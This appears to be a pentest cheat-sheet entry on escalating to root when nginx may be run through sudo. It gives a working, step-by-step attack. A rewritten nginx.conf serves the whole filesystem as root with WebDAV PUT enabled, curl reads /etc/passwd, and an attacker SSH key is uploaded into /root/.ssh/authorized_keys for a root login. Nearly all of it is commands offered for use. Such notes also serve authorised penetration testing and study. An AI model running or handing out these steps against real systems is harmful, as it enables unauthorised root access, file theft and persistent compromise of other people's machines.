# Nginx
## Sudo
If the binary is allowed to run as superuser by sudo, the nginx.conf file can be configured to run as root from the '/' directory.
1. Check the Example Configuration File
```bash
cat /etc/nginx/nginx.conf
```
2. Copy the File 
```bash
cp /etc/nginx/nginx.conf /tmp
```
3. Alter the File
```file
user root;
worker_processes auto;
pid /run/nginx2.pid;
include /etc/nginx/modules-enabled/*.conf;
events {
    worker_connections 768;
}
http {
    server {
        listen 1337;
        location / {
            root /;
            autoindex on;
            dav_methods PUT;
        }
    }
}
```
4. Run Nginx as Sudo
```bash
sudo nginx -c /tmp/nginx.conf
```
5. Test with 'Curl'
```bash
curl localhost:1337/etc/passwd
```
6. Create an SSH Key
```bash
ssh-keygen
```
7. Upload SSH Key to Target
```bash
curl TARGET_IP:PORT/root/.ssh/authorized_keys --upload-file KEY.pub
```
8. Login via SSH Key
```bash
ssh -i KEY root@TARGET_IP
```
>[!NOTE]
> Steps 7 and 8 only work if the Target allows root ssh login with a key. 
